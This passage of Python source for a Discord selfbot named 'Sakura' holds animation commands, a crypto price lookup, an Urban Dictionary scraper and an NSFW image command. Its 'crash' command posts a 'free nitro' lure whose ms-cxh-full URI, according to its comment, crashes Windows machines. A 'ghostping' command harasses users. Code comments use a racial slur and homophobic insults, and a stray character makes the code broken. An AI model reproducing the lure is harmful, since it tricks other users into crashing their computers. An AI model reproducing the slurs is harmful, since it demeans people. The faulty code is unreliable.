            await ctx.message.edit(content=i)

@Sakura.command()
async def warning(ctx):
        list = (
            "`LOAD !! WARNING !! SYSTEM OVER`",
            "`OAD !! WARNING !! SYSTEM OVERL`",
            "`AD !! WARNING !! SYSTEM OVERLO`",
            "`D !! WARNING !! SYSTEM OVERLOA`",
            "`! WARNING !! SYSTEM OVERLOAD !`",
            "`WARNING !! SYSTEM OVERLOAD !!`",
            "`ARNING !! SYSTEM OVERLOAD !! W`",
            "`RNING !! SYSTEM OVERLOAD !! WA`",
            "`NING !! SYSTEM OVERLOAD !! WAR`",
            "`ING !! SYSTEM OVERLOAD !! WARN`",
            "`NG !! SYSTEM OVERLOAD !! WARNI`",
            "`G !! SYSTEM OVERLOAD !! WARNIN`",
            "`!! SYSTEM OVERLOAD !! WARNING`",
            "`! SYSTEM OVERLOAD !! WARNING !`",
            "`SYSTEM OVERLOAD !! WARNING !!`",
            "`IMMINENT SHUT-DOWN IN 0.5 SEC!`",
            "`WARNING !! SYSTEM OVERLOAD !!`",
            "`IMMINENT SHUT-DOWN IN 0.2 SEC!`",
            "`SYSTEM OVERLOAD !! WARNING !!`",
            "`IMMINENT SHUT-DOWN IN 0.01 SEC!`",
            "`SHUT-DOWN EXIT ERROR ¯\\(｡･益･)/¯`",
            "`CTRL + R FOR MANUAL OVERRIDE..`",
        )
        for i in list:
            await asyncio.sleep(1.5)
            await ctx.message.edit(content=i)

@Sakura.command()
async def cathi(ctx, *, text: str = "Hi..."):
        list = (
            """ຸ 　　　＿＿_＿＿
　　／　／　  ／|"
　　|￣￣￣￣|　|
　　|　　　　|／
　　￣￣￣￣""",
            f"""ຸ 　　　{text}
 　   　 ∧＿∧＿_
　　／(´･ω･`)  ／＼
　／|￣￣￣￣|＼／
　　|　　　　|／
　　￣￣￣￣""",
        )
        for i in range(3):
            for cat in list:
                await asyncio.sleep(1.5)
                await ctx.message.edit(content=cat)

@Sakura.command()
async def flop(ctx):
        list = (
            "(   ° - °) (' - '   )",
            "(\\\° - °)\ (' - '   )",
            "(—°□°)— (' - '   )",
            "(╯°□°)╯(' - '   )",
            "(╯°□°)╯︵(\\\ .o.)\\",
        )
        for i in list:
            await asyncio.sleep(1.5)
            await ctx.message.edit(content=i)

@Sakura.command()
async def daily(ctx):
        await ctx.message.delete()
        await ctx.send("Getting BTC/ETH info...")
        # BTC info
        r = requests.get(
            "https://min-api.cryptocompare.com/data/price?fsym=BTC&tsyms=USD,EUR,GBP"
        )
        r = r.json()
        usd = r["USD"]
        eur = r["EUR"]
        gbp = r["GBP"]
        em = discord.Embed(
            description=f"USD: `{str(usd)}$`\n\nEUR: `{str(eur)}€`\n\nGBP: `{str(gbp)}£`"
        )
        em.set_author(
            name="Bitcoin",
            icon_url="https://cdn.pixabay.com/photo/2013/12/08/12/12/bitcoin-225079_960_720.png",
        )
        await ctx.send(embed=em)

@Sakura.command()
async def crash(ctx):
        #"""Sends a link when clicked rapes a windwos computer""" (totally didnt nigger this bits of code from github)
        await ctx.message.delete()
        await ctx.send("Click this for free nitro! <ms-cxh-full://0>")

@Sakura.command()
async def snipe2(ctx):
        await ctx.send("> " + self.bot.snipes[ctx.message.channel.id])

        
##dumb shit
@Sakura.command()
async def ghostping(ctx):
        #"""Ghostpings people"""
        await ctx.delete()

@Sakura.command()
async def crash2(ctx):
        await ctx.message.delete()
        await ctx.send("When You Cant Breathe:")
    



@Sakura.command()
async def cringe(ctx):
        await ctx.message.delete()
        await ctx.send("https://cdn.discordapp.com/attachments/902363685350174760/903055994521784350/you_are_cirnge.mp4")


        

@Sakura.command()
async def neko(ctx, message):
        """Shows hentai"""
        await ctx.delete()
        r = random.randint(0, 255)
        g = random.randint(0, 255)
        b = random.randint(0, 255)
        msg = message
        embed = discord.Embed(
            title=":flushed:", description="", colour=discord.Colour.from_rgb(r, g, b),
        )
        url = nekos.img(msg)
        embed.set_image(url=url)
        await ctx.send(embed=embed)

@Sakura.command()
async def nekoalt(ctx):
        """Shows all options for neko"""
        await ctx.delete()
        possible = [
            "**Feet** | **Yuri** | **Trap** | **Futanri** | **Hololewd** | **Lewdkemo** | **Solo** | **Feet** | **Cum** | **Erokemo** | **Les** | **Wallpaper** | **Lewd** | **Feed** | **Gecg** | **Femdom** | **Eroyuri** | **Eron** | **Blowjob** | **Kemonomimi** | **Gasm** | **Anal** | **Erok** | **Boobs** | **Smallboobs** | **Spank** | **Hentai** | **Holo** | **Keta** | **Pussy** | **Tits** | **Classic** | **Kuni** | **Waifu** | **Pat** | **Poke** | **Neko** | **Cuddle** | **Kiss** | **Baka** | **Smug**",
        ]

        list = ""
        for item in possible:
            list += f"{item}\n"
        r = random.randint(50, 255)
        g = random.randint(50, 255)
        b = random.randint(50, 255)
        embed = discord.Embed(
            title=":flushed: options:", description=f"{list}", colour=0xffcaff,
        )
        await ctx.send(embed=embed)

@Sakura.command()
async def sysinfo(ctx):
        start = time.perf_counter()
        message = await ctx.send("Ping...")
        end = time.perf_counter()
        duration = (end - start) * 1000
        await ctx.message.delete()
        await message.delete()
        cpuavg = psutil.cpu_percent(interval=None)
        mem = psutil.virtual_memory()[2]
        durround = round(duration, 3)
        embed = discord.Embed(
            title="System information", description="", color=0xffcaff
        )
        embed.set_thumbnail(url="https://i.imgur.com/GuRAHY1.png")
        embed.add_field(name="CPU", value=f"{cpuavg}%", inline=True)
        embed.add_field(name="Ram", value=f"{mem}%", inline=True)
        embed.add_field(name="Latency", value=f"{durround}ms", inline=True)
        embed.add_field(name="OS", value=f"{sys.platform}", inline=True)
        embed.set_footer(text="Version  3.1")-
        await ctx.send(embed=embed)

@Sakura.command()
async def urban(ctx, *, message):
   
       # Note: ~~Only works with single words not sentences~~

    #This is now fixed but you have to use "multi%20word%20search"
       # instead of just multi word senctence i know a little gay but it works
     
        term = message.replace(" ", "%20")
        termu = message
        url = "https://www.urbandictionary.com/define.php?term="
        url += "+" + term
        try:
            html = urllib.request.urlopen(url)
            soup = BeautifulSoup(html, "html.parser")
            definition = soup.find(class_="meaning").get_text()
            embed = discord.Embed(
                title=":mag:" + termu, description=definition, color=0x0062F4
            )
            embed.set_footer(
                text="Urban Dictionary API for Discord by Sakura",
                icon_url="https://scontent-arn2-1.xx.fbcdn.net/v/t1.0-0/p370x247/67117447_10156819767173172_7554494861143965696_n.png?_nc_cat=107&_nc_sid=85a577&_nc_ohc=dKHQazPgSHkAX93fdD_&_nc_ht=scontent-arn2-1.xx&oh=69e04cad9131d20053d19a993db34492&oe=5F56F619",
            )
            embed.set_thumbnail(
                url="https://s3.amazonaws.com/pushbullet-uploads/ujxPklLhvyK-RGDsDKNxGPDh29VWVd5iJOh8hkiBTRyC/urban_dictionary.jpg?w=188&h=188&fit=crop"
            )
            embed.set_author(
                name="Sakura",
                icon_url="https://cdn.discordapp.com/avatars/903325830200045568/89f9b50c9aad326518dc508f1c798a86.png?size=2048",
            )
            await ctx.send(embed=embed)

        except:
            msg = "Phrase doesn't exist in the dictionary surprisingly."
            await ctx.send(msg)
            
#the fucking color so i dont have to go past like 600 lines to get 0xffcaff
if __name__ == '__main__':
    Init()






 #     #                                                  #####                                                                 
 ##   ##   ##   #####  ######      ##   #    # #####     #     #  ####  #####  ###### #####                                     
 # # # #  #  #  #    # #          #  #  ##   # #    #    #       #    # #    # #      #    #                                    
 #  #  # #    # #    # #####     #    # # #  # #    #    #       #    # #    # #####  #    #                                    
 #     # ###### #    # #         ###### #  # # #    #    #       #    # #    # #      #    #                                    
 #     # #    # #    # #         #    # #   ## #    #    #     # #    # #    # #      #    #                                    
 #     # #    # #####  ######    #    # #    # #####      #####   ####  #####  ###### #####                          
                                                                                                                                
 #     #                                                                                                                        
 #  #  # # ##### #    #                                                                                                         
 #  #  # #   #   #    #                                                                                                         
 #  #  # #   #   ######                                                                                                         
 #  #  # #   #   #    #                                                                                                         
 #  #  # #   #   #    #                                                                                                         
  ## ##  #   #   #    #                                                                                                         
                                                                                                                                
 #                               ######            #####                                         #####  #######      
 #        ####  #    # ######    #     # #   #    #     #   ##   #    # #    # #####    ##      #     # #            
 #       #    # #    # #         #     #  # #     #        #  #  #   #  #    # #    #  #  #     #     # #       
 #       #    # #    # #####     ######    #       #####  #    # ####   #    # #    # #    #     ###### ######     
 #       #    # #    # #         #     #   #            # ###### #  #   #    # #####  ######          #       #     
 #       #    #  #  #  #         #     #   #      #     # #    # #   #  #    # #   #  #    #    #     # #     #      
 #######  ####    ##   ######    ######    #       #####  #    # #    #  ####  #    # #    #     #####   #####        
                                                                                                                
                                                                                                                                
                                                                                                                                
                                                                                                                                
#                       @@@@@@           @@@@@@
#                     @@@@@@@@@@       @@@@@@@@@@
#                   @@@@@@@@@@@@@@   @@@@@@@@@@@@@@
#                 @@@@@@@@@@@@@@@@@ @@@@@@@@@@@@@@@@@
#                @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
#               @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
#               @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
#               @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
#                @@@@@@@@@@@@@    ABi    @@@@@@@@@@@@@
#                 @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
#                  @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
#                   @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
#                     @@@@@@@@@@@@@@@@@@@@@@@@@@@
#                       @@@@@@@@@@@@@@@@@@@@@@@
#                         @@@@@@@@@@@@@@@@@@@
#                           @@@@@@@@@@@@@@@
#                             @@@@@@@@@@@
#                               @@@@@@@
#                                 @@@
#                                  @                                                                                                                                
#                                                                                                                                
                                                                                                                                
                                                                                                                                
                                                                                                                                
